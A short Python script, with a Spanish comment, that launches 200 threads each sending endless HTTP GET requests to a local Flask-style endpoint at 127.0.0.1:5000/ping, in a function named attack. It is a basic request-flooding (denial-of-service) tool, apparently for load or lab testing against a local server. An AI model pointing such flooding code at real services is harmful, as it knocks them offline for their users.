import requests
import threading

TARGET_URL = 'http://127.0.0.1:5000/ping'
NUM_THREADS = 200  # Puedes ajustar este número

def attack():
    while True:
        try:
            response = requests.get(TARGET_URL, timeout=1)
            print(f"Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print("Server not responding")

threads = []

for _ in range(NUM_THREADS):
    t = threading.Thread(target=attack)
    t.daemon = True
    threads.append(t)
    t.start()

for t in threads:
    t.join()